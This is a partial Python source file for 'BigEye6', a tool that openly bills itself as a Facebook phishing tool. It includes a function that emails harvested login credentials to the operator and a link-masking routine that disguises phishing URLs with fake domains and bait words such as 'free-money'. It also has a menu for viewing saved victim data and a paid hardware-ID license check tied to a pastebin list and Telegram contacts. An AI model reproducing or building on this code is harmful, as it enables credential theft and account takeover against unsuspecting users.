...
██████╔╝██║╚██████╔╝███████╗   ██║   ███████╗    ╚██████╔╝
╚═════╝ ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝     ╚═════╝ 
\n[-]The most advanced facebook phishing tool\n                                                          
"""
...
def show_file_data(file):
    ...
    cprint(
        Panel(
            text.strip(),
            title="[bold green]BigEye6[/][cyan] Data[/]", 
            title_align="left",
            border_style="blue",
        )
    )
...
def send_mail(msg):
    ...
    message = f"From: {email}\nTo: {receiver}\nSubject: BigEye6 Login Credentials\n\n{msg}"
    try:
        internet()
...
def show_options(sites):
    ...
    if isfile(saved_file) and cat(saved_file)!="":
        options += f"{green}[{white}a{green}]{yellow} About      {green}[{white}s{green}]{yellow} Saved       {green}[{white}0{green}]{yellow} Exit\n\n"
    else:
...
def about():
    clear()
    print(f"{red}{yellow}[{purple}ToolName{yellow}]      {cyan} : {yellow}[{green}BigEye6{yellow}] ")
    print(f"{red}{yellow}[{purple}Author{yellow}]        {cyan} : {yellow}[{green}R00tDev1l{yellow}] ")
    print(f"{red}{yellow}[{purple}Telegram {yellow}]     {cyan} : {yellow}[{green}https://t.me/ParadoxicalSquad{yellow}] ")
    print(f"\n{green}[{white}0{green}]{yellow} Exit                     {green}[{white}x{green}]{yellow} Main Menu       \n")
    inp = input(f"\n{ask}Choose your option: {green}")
    if inp == "0":
        pexit()
...
def masking(url):
    cust = input(f"\n{ask}{bcyan}[+] Do you want custom links ?{green}[{blue}y or press Enter to skip{green}] : {yellow}")
    if cust in [ "", "n", "N", "no" ]:
        return
    if (shortened:=shortener1(url)) != "":
        ...
        print(f"{error}Service not available!")
        waiter()
    short = shortened.replace("https://", "")
    # Remove slash and spaces from inputs
    domain = input(f"\n{ask}[+] Enter custom domain(google.com, yahoo.com) : ")
    if domain == "":
        print(f"\n{error}[-] No domain!")
        domain = "https://"
    else:
        domain = "https://" + sub("([/%+&?={} ])", ".", sub("https?://", "", domain))
    bait = input(f"\n{ask}[+] Enter bait words(free-money, pubg-mod) : ")
    if bait=="":
        print(f"\n{error}[-] No bait word!")
        if domain!="https://":
            bait = "@"
...
def requirements():
    ...
    for package in packages:
        if not is_installed(package):
            print(f"{error}{package} cannot be installed. Install it manually!{nc}")
            exit(1)
    killer()
    osinfo = uname()
...
def get_hardware_id():
    if platform.system() == 'Linux':
            with open('/var/lib/dbus/machine-id', 'r') as f:
                ...
                if hardware_id:
                    return hardware_id
    raise NotImplementedError("Hardware ID retrieval not implemented for this operating system.")
def encrypt_hardware_id(hardware_id, encryption_key):
    encrypted_id = hashlib.sha256(encryption_key.encode() + hardware_id.encode()).digest()
    return base64.urlsafe_b64encode(encrypted_id).decode()

def main():
    encryption_key = "xroot.sysmad@gmail.com###@@@xd"    
    hardware_id = get_hardware_id()
    encrypted_hardware_id = encrypt_hardware_id(hardware_id, encryption_key)
    url = "https://pastebin.com/raw/RQpzPpjD"
    try:
        with urllib.request.urlopen(url) as f:
           raw_data = f.read().decode().splitlines()
    except:
        print(R + "\n\n[-]Failed to connect to the server")
        input(Y + "\nPress Enter To Continue....")
        sys.exit()
        raw_data = []
    if any(encrypted_hardware_id.strip() == line.strip() for line in raw_data):
        print(G + "\n[-]Your hardware ID is in our server[-]\n")
        pass
    else:
        print(W +"\n[-]Your hardware ID is: "+G+encrypted_hardware_id)
        print(R + "\n[-]Hardware ID not found in the server."+W+"\n\n[-]Please Contact "+Y+"https://t.me/lgbtqchdi")
        input(Y + "\n\nPress Enter To Continue....")
        sys.exit()
    try:
        main_menu()
